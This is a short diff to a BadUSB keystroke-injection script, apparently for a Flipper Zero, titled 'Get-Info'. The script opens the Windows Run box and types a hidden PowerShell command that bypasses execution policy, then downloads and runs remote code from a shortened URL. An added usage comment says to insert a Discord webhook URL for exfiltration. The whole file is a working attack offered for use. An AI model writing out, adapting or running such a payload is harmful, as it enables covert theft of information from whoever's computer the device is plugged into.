@@ -1,6 +1,8 @@
-REM Title: Get Info
+REM Title: Get-Info
 REM Author: Contrxl
+REM Link: https://github.com/contrxl/flipper-stuff/tree/main/badusb
+REM Usage: Take a copy of this file and insert your Discord Webhook URL into $dc for exfiltration.
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $db='';irm https://rb.gy/6oapzb| iex
+STRING powershell -w h -NoP -NonI -Ep Bypass $dc='';irm https://rb.gy/6oapzb| iex
 ENTER
